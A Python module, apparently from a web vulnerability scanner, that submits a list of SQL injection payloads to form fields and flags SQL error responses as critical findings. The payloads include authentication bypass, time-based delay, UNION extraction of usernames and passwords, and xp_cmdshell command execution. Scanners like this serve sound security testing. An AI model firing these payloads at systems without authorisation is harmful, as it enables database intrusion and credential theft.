from .utils import check_sql_errors
from .utils import submit_form

SQLI_PAYLOADS = [
    "' OR '1'='1'--",
    "' OR SLEEP(5)--",
    '" OR "1"="1',
    "' UNION SELECT null,username,password FROM users--",
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "'; EXEC xp_cmdshell('echo vulnerable')--"
]

def test_sqli(url, form_details, session):
    """Test a form for SQL Injection vulnerability"""
    vulnerabilities = []
    for payload in SQLI_PAYLOADS:
        response = submit_form(form_details, url, payload, session)
        if check_sql_errors(response):
            vulnerabilities.append({
                'type': 'SQL Injection',
                'url': response.url,
                'payload': payload,
                'severity': 'Critical'
            })
    return vulnerabilities